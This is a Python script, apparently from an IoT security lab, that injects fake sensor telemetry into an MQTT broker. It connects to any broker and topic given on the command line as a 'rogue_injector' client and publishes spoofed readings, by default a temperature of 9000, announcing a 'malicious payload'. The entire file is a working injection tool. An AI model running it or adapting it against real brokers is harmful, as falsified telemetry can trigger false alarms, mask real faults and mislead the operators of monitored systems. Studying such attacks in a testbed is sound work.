import paho.mqtt.client as mqtt
import time
import json
import argparse

def _parse_readings(raw):
    """Parse ['temperature=40.9', 'pressure=104.8'] into dict."""
    readings = {}
    for pair in raw:
        if "=" in pair:
            k, v = pair.split("=", 1)
            try:
                readings[k] = float(v)
            except ValueError:
                readings[k] = v
    return readings


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker!")
    else:
        print(f"Failed to connect, return code {rc}")


def _default_sensor_id(topic):
    """Extract sensor_id from last segment of topic path."""
    return topic.rstrip("/").split("/")[-1] if topic else "unknown"


# Module-level parser for testing
parser = argparse.ArgumentParser(description="MQTT Fake Telemetry Injection")
parser.add_argument("--broker", required=True, help="MQTT Broker IP/Hostname")
parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
parser.add_argument("--topic", default="sensors/data", help="Target topic")
parser.add_argument("--sensor-id", default=None, help="Sensor ID (default: last segment of --topic)")
parser.add_argument(
    "--profile", default="normal",
    help="Sensor behavior profile (tags the InfluxDB point)",
)
parser.add_argument(
    "--readings", nargs="*", default=["temperature=9000"],
    help="Readings as key=val pairs, e.g. temperature=40.9 pressure=104.8",
)

if __name__ == "__main__":
    args = parser.parse_args()

    sensor_id = args.sensor_id or _default_sensor_id(args.topic)
    readings = _parse_readings(args.readings)
    payload = {
        "sensor_id": sensor_id,
        "profile": args.profile,
        "readings": readings,
        "fake_injection": True,
        "timestamp": time.time(),
    }
    payload_str = json.dumps(payload)
    print(f"Injecting malicious payload to '{args.topic}': {payload_str}")

    client = mqtt.Client("rogue_injector")
    client.on_connect = on_connect

    print(f"Connecting to {args.broker}:{args.port}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()

    time.sleep(1)

    client.publish(args.topic, payload_str, qos=1)

    time.sleep(1)
    client.loop_stop()
    client.disconnect()
    print("Injection complete.")